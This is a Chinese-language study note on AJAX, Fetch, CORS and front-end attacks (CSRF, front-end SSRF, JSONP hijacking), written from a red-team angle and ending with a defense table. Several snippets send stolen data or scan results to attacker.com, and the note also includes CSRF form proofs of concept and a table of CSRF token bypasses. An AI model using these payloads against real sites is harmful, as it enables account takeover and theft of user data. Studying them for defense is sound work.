## 目录

- [[#一、AJAX基础|一、AJAX基础]]
- [[#二、XMLHttpRequest详解|二、XMLHttpRequest详解]]
- [[#三、Fetch API详解|三、Fetch API详解]]
- [[#四、CORS与跨域请求|四、CORS与跨域请求]]
- [[#五、CSRF攻击原理与利用|五、CSRF攻击原理与利用]]
- [[#六、SSRF via前端|六、SSRF via前端]]
- [[#七、JSONP劫持|七、JSONP劫持]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、AJAX基础

AJAX = Asynchronous JavaScript And XML（虽然现在常用JSON而非XML）

核心能力：不刷新页面就能向服务器发送HTTP请求并获取数据。

### 演进历史

```
XMLHttpRequest (2000s) → Fetch API (2015) → Axios等库
```

### 同步 vs 异步

```javascript
// 同步（阻塞UI，已废弃）
xhr.open('GET', '/api/data', false); // false = 同步
xhr.send(); // UI卡住直到请求完成

// 异步（标准方式）
xhr.open('GET', '/api/data', true); // true = 异步
xhr.onload = function() { console.log(xhr.responseText); };
xhr.send();
```

## 二、XMLHttpRequest详解

### 基础请求

```javascript
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.example.com/users');
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.withCredentials = true; // 携带Cookie（跨域需要服务器配合CORS）

xhr.onreadystatechange = function() {
 if (xhr.readyState === 4 && xhr.status === 200) {
 console.log(JSON.parse(xhr.responseText));
 }
};

xhr.send();
```

### readyState状态

| 值 | 状态 | 说明 |
|----|------|------|
| 0 | UNSENT | 未调用open |
| 1 | OPENED | 已调用open |
| 2 | HEADERS_RECEIVED | 收到响应头 |
| 3 | LOADING | 正在接收响应体 |
| 4 | DONE | 完成 |

### CSRF场景中的XHR

```javascript
// 攻击者脚本：自动发起CSRF请求窃取数据
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://bank.com/api/accounts', true);
xhr.withCredentials = true; // 自动带Cookie
xhr.onload = function() {
 // 把获取的数据发送到攻击者服务器
 fetch('https://attacker.com/steal', {
 method: 'POST',
 body: xhr.responseText
 });
};
xhr.send();
```

## 三、Fetch API详解

### 基础fetch

```javascript
fetch('https://api.example.com/users', {
 method: 'GET',
 headers: {
 'Content-Type': 'application/json',
 },
 credentials: 'include', // 携带Cookie
})
 .then(response => response.json())
 .then(data => console.log(data))
 .catch(err => console.error(err));
```

### credentials选项

| 值 | Cookie行为 |
|-----|-----------|
| `'omit'` | 永远不发送Cookie |
| `'same-origin'` | 同源才发送（默认） |
| `'include'` | 始终发送（CORS需要服务器配合） |

### fetch特点（vs XHR）

| 特性 | XHR | fetch |
|------|-----|-------|
| Promise支持 | 需包装 | 原生Promise |
| Service Worker | 不支持 | 支持 |
| 超时设置 | `xhr.timeout` | 需要AbortController |
| 进度事件 | `onprogress` | 没有（需ReadableStream） |
| 错误处理 | `onerror` | 仅网络错误才reject（404/500算resolve） |
| 中止请求 | `xhr.abort()` | `AbortController` |

### 中止请求

```javascript
const controller = new AbortController();
const signal = controller.signal;

fetch('https://api.example.com/data', { signal })
 .then(response => response.json());

// 5秒后中止
setTimeout(() => controller.abort(), 5000);
```

## 四、CORS与跨域请求

### 什么是CORS

CORS (Cross-Origin Resource Sharing) 是服务器声明允许跨域访问的机制。

**简单请求条件（全部满足）：**
1. 方法：GET / HEAD / POST
2. 头部仅：Accept, Accept-Language, Content-Language, Content-Type
3. Content-Type仅：`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

### 预检请求（Preflight）

不符合简单请求条件时，浏览器先发OPTIONS预检：

```http
OPTIONS /api/data HTTP/1.1
Origin: https://attacker.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

### CORS关键响应头

| 响应头 | 说明 |
|--------|------|
| `Access-Control-Allow-Origin` | 允许的源（不能是`*`当credentials=true） |
| `Access-Control-Allow-Credentials` | 是否允许携带凭证 |
| `Access-Control-Expose-Headers` | JS可读取的响应头 |
| `Access-Control-Allow-Methods` | 允许的方法 |
| `Access-Control-Allow-Headers` | 允许的请求头 |
| `Access-Control-Max-Age` | 预检缓存时间 |

### CORS配置错误识别

```bash
# 反射Origin
Access-Control-Allow-Origin: https://evil.com
# (Origin: evil.com → 反射 → 允许任意来源)

# 空Origin
Access-Control-Allow-Origin: null
# (sandboxed iframe或data: URI的Origin为null)

# 预检不过滤方法
Access-Control-Allow-Methods: *
```

## 五、CSRF攻击原理与利用

### 攻击流程

```
1. 受害者登录 bank.com → 获得Session Cookie
2. 受害者访问 evil.com（攻击者控制）
3. evil.com 自动提交表单到 bank.com/transfer
4. 浏览器自动携带 bank.com 的Cookie
5. bank.com 认为是受害者本人操作 → 转账成功
```

### CSRF Form模板

```html
<!-- 最简单的CSRF POC -->
<form action="https://target.com/change_email" method="POST" id="csrf">
 <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### 跨Content-Type CSRF

```html
<!-- 发送JSON格式的CSRF（利用fetch API） -->
<form id="csrf" enctype="text/plain" 
 action="https://target.com/api/update" method="POST">
 <input type="hidden" name='{"email":"attacker@evil.com","ignored":"' value='"}'>
</form>
<script>document.getElementById('csrf').submit();</script>
<!-- 请求体：{"email":"attacker@evil.com","ignored":"="} -->
```

### CSRF Token绕过

| 场景 | 绕过方式 |
|------|---------|
| Token检查缺失 | 直接CSRF |
| Token可预测 | 猜测Token值 |
| Token在Cookie中 | 利用Cookie Jar溢出 / CRLF注入 |
| Token仅在前端验证 | 绕过JS验证 |
| Token复用 | 用同一个合法Token多次攻击 |
| Token在URL参数中 | Referer泄露 |

## 六、SSRF via前端

### 内网探测

```javascript
// 利用img标签探测内网
<img src="http://192.168.1.1:8080" onerror="log('closed')" onload="log('open')">

// 批量内网探测
for (let i = 1; i <= 254; i++) {
 let img = new Image();
 img.src = `http://192.168.0.${i}:80/favicon.ico`;
 img.onload = function() {
 fetch('https://attacker.com/alive?ip=192.168.0.' + i);
 };
}
```

### WebRTC泄露内网IP

```javascript
// 通过WebRTC泄露真实内网IP（即使使用VPN/代理）
const pc = new RTCPeerConnection({ iceServers: [] });
pc.createDataChannel('');
pc.createOffer().then(offer => pc.setLocalDescription(offer));

pc.onicecandidate = function(e) {
 if (!e.candidate) return;
 const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
 if (ip) {
 fetch('https://attacker.com/ip?internal=' + ip[0]);
 }
};
```

## 七、JSONP劫持

### JSONP原理

```javascript
// 服务器端JSONP接口
// GET /api/user?callback=handleResponse
// 返回：handleResponse({"name":"admin","email":"admin@bank.com"})

// 攻击者页面
<script>
 function handleResponse(data) {
 fetch('https://attacker.com/steal', {
 method: 'POST', 
 body: JSON.stringify(data)
 });
 }
</script>
<script src="https://bank.com/api/user?callback=handleResponse"></script>
```

### JSONP检测

```bash
# 检测JSONP端点
curl "https://target.com/api/user?callback=test"
# 如果返回 test({...}) → 存在JSONP

# 尝试修改callback参数名
callback=test
jsonp=test
cb=test
jsoncallback=test
```

## 八、红队视角总结

### CSRF/SSRF/JSONP攻击矩阵

| 攻击 | 必要条件 | 目标 | 难度 |
|------|---------|------|------|
| CSRF - GET | 无Token | 状态变更端点 | 低 |
| CSRF - POST | 无Token | 数据修改端点 | 低 |
| CSRF - JSON | Content-Type可控 | JSON API | 中 |
| JSONP劫持 | JSONP端点+回调可控 | 用户敏感数据 | 中 |
| SSRF via前端 | XSS或可控页面 | 内网服务 | 中高 |
| CORS配置错误 | 反射Origin | 同源策略绕过 | 中 |

### 防御速查

| 攻击 | 防御方式 |
|------|---------|
| CSRF | CSRF Token + SameSite Cookie |
| JSONP劫持 | 改用CORS + Fetch + 验证Origin |
| SSRF | 服务端验证URL，内网地址黑名单 |
| CORS错误 | 固定白名单Origin，不用`*` |

---
**返回** [[JS基础总目录|JavaScript 总目录]] | [[../前端基础总目录|前端基础总目录]]
